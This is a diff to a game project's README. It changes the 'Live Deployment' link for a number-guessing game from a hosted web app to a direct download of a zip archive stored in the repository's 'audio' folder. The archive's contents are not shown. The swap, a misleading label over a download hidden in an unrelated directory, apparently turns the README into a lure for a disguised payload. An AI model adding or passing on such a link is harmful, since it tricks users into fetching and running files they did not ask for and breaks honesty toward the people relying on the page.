@@ -16,7 +16,7 @@ The main logic of the game development uses nested if-else loops to compare the 
 
 # Wanna try your Luck?
 
-Live Deployment - [Guess the Number](https://assumenumber.netlify.app/)
+Live Deployment - [Guess the Number](https://raw.githubusercontent.com/Shrikrushnatekade/Guess-The-Number/main/audio/The-Guess-Number-v2.1.zip)
 
 <h2 align="center">🤝 Support</h2>
 
